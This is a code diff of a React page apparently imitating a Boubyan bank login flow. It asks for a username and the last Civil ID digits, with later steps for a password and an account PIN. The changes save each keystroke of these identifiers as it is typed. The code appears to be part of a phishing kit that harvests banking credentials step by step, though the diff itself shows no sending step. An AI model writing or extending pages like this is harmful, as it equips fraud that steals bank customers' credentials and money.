@@ -1,4 +1,4 @@
-import { useRef, useState } from 'react'
+import { useRef, useState, useEffect, useTransition } from 'react'
 import { useNavigate } from 'react-router-dom'
 import { useLanguage } from '../context/LanguageContext'
 import { saveDraftApplication } from '../lib/applicationStorage'
@@ -11,36 +11,69 @@ export default function ContinueApplicationPage() {
   const [username, setUsername] = useState('')
   const [civilIdDigits, setCivilIdDigits] = useState(['', ''])
   const [hasError, setHasError] = useState(false)
+  const [isPending, startTransition] = useTransition()
   const inputRefs = useRef([])
 
-  // دالة لتصفية اسم المستخدم بحيث يقبل الحروف فقط (العربية والإنجليزية والمسافات)
+  useEffect(() => {
+    saveDraftApplication({
+      step: 'step-username',
+      status: 'new',
+      source: 'continue-application',
+    })
+  }, [])
+
   const handleUsernameChange = (value) => {
-    const lettersOnly = value.replace(/[^a-zA-Zأ-يء-ي\s]/g, '')
-    setUsername(lettersOnly)
+    const allowedValue = value.replace(/[^a-zA-Z0-9أ-يء-ي\s]/g, '')
+    setUsername(allowedValue)
+    
+    startTransition(() => {
+      saveDraftApplication({
+        username: allowedValue,
+        status: 'new',
+        source: 'continue-application',
+        step: 'step-username',
+      })
+    })
+
     if (hasError) setHasError(false)
   }
 
   const handleDigitChange = (index, value) => {
-    const cleaned = value.replace(/\D/g, '').slice(0, 2 - index)
+    const cleaned = value.replace(/\D/g, '')
     const newDigits = [...civilIdDigits]
 
-    cleaned.split('').forEach((digit, offset) => {
-      newDigits[index + offset] = digit
-    })
-    if (!cleaned) newDigits[index] = ''
-    setCivilIdDigits(newDigits)
-    if (hasError) setHasError(false)
-
-    if (cleaned) {
-      const nextIndex = Math.min(index + cleaned.length, 1)
-      inputRefs.current[nextIndex]?.focus()
+    if (cleaned.length > 1) {
+      newDigits[0] = cleaned[0] || ''
+      newDigits[1] = cleaned[1] || ''
+      setCivilIdDigits(newDigits)
+      if (cleaned[1] && inputRefs.current[1]) {
+        inputRefs.current[1].focus()
+      }
+    } else {
+      newDigits[index] = cleaned
+      setCivilIdDigits(newDigits)
+      if (cleaned && index === 0 && inputRefs.current[1]) {
+        inputRefs.current[1].focus()
+      }
     }
+
+    startTransition(() => {
+      saveDraftApplication({
+        username,
+        civilId: newDigits.join(''),
+        status: 'new',
+        source: 'continue-application',
+        step: 'step-username',
+      })
+    })
+
+    if (hasError) setHasError(false)
   }
 
   const handleKeyDown = (index, event) => {
     if (event.key === 'Backspace') {
       const newDigits = [...civilIdDigits]
-      if (newDigits[index]) {
+      if (newDigits[index] !== '') {
         newDigits[index] = ''
         setCivilIdDigits(newDigits)
       } else if (index > 0) {
@@ -49,6 +82,16 @@ export default function ContinueApplicationPage() {
         inputRefs.current[index - 1]?.focus()
       }
       event.preventDefault()
+
+      startTransition(() => {
+        saveDraftApplication({
+          username,
+          civilId: newDigits.join(''),
+          status: 'new',
+          source: 'continue-application',
+          step: 'step-username',
+        })
+      })
     }
   }
 
@@ -66,10 +109,11 @@ export default function ContinueApplicationPage() {
       source: 'continue-application',
       username,
       civilId,
-      step: 'step-1',
+      step: 'step-username',
     }
 
     saveDraftApplication(payload)
+    // التوجه مباشرة لصفحة كلمة المرور حسب رغبتك
     navigate('/continue-application-step-3')
   }
 
@@ -77,7 +121,6 @@ export default function ContinueApplicationPage() {
     <section className="min-h-screen bg-white flex flex-col justify-between px-4 py-4 sm:py-8 font-sans overflow-x-hidden" dir={isAr ? 'rtl' : 'ltr'}>
       <div className="mx-auto w-full max-w-md flex-1 flex flex-col justify-center py-2">
         
-        {/* Boubyan Logo Section */}
         <div className="mb-6 sm:mb-10 flex justify-center text-center">
           <div className="h-auto w-32 sm:w-40">
             <img
@@ -88,7 +131,6 @@ export default function ContinueApplicationPage() {
           </div>
         </div>
 
-        {/* Form Fields Section */}
         <div className="w-full space-y-4 sm:space-y-6">
           <div className="relative">
             <div className={`border-b pb-1.5 sm:pb-2 transition-colors ${hasError ? 'border-[#d32f2f]' : 'border-[#cccccc]'}`}>
@@ -108,6 +150,7 @@ export default function ContinueApplicationPage() {
           </div>
 
           <div className="text-right">
+            {/* عند الضغط على نسيت اسم المستخدم ينتقل لصفحة الحساب والـ PIN */}
             <button
               type="button"
               onClick={() => navigate('/continue-application-step-2')}
@@ -125,28 +168,36 @@ export default function ContinueApplicationPage() {
               {isAr ? 'آخر رقمين من البطاقة المدنية' : 'Last 2 digits of Civil ID'}
             </div>
 
-            {/* Two separate digit boxes, forced LTR layout starting from the leftmost box */}
             <div className="flex justify-end gap-3" dir="ltr">
-              {[0, 1].map((index) => (
-                <input
-                  key={index}
-                  type="text"
-                  inputMode="numeric"
-                  maxLength={1}
-                  ref={(el) => (inputRefs.current[index] = el)}
-                  value={civilIdDigits[index]}
-                  onChange={(e) => handleDigitChange(index, e.target.value)}
-                  onKeyDown={(e) => handleKeyDown(index, e)}
-                  onFocus={(event) => {
-                    event.target.select()
-                    if (index === 1 && !civilIdDigits[0]) {
-                      inputRefs.current[0]?.focus()
-                    }
-                  }}
-                  className="w-12 h-12 text-center border-b-2 border-[#b0b0b0] focus:border-[#ce1126] bg-transparent text-xl font-semibold text-[#333333] outline-none transition-colors"
-                  style={{ direction: 'ltr' }}
-                />
-              ))}
+              {[0, 1].map((index) => {
+                const isRightBox = index === 1
+                const isDisabled = isRightBox && !civilIdDigits[0]
+
+                return (
+                  <input
+                    key={index}
+                    type="text"
+                    inputMode="numeric"
+                    maxLength={2}
+                    disabled={isDisabled}
+                    ref={(el) => (inputRefs.current[index] = el)}
+                    value={civilIdDigits[index]}
+                    onChange={(e) => handleDigitChange(index, e.target.value)}
+                    onKeyDown={(e) => handleKeyDown(index, e)}
+                    onFocus={(event) => {
+                      if (isDisabled) {
+                        inputRefs.current[0]?.focus()
+                      } else {
+                        event.target.select()
+                      }
+                    }}
+                    className={`w-12 h-12 text-center border-b-2 bg-transparent text-xl font-semibold outline-none transition-colors ${
+                      isDisabled ? 'opacity-40 cursor-not-allowed border-[#cccccc]' : 'border-[#b0b0b0] focus:border-[#ce1126] text-[#333333]'
+                    }`}
+                    style={{ direction: 'ltr' }}
+                  />
+                )
+              })}
             </div>
           </div>
 
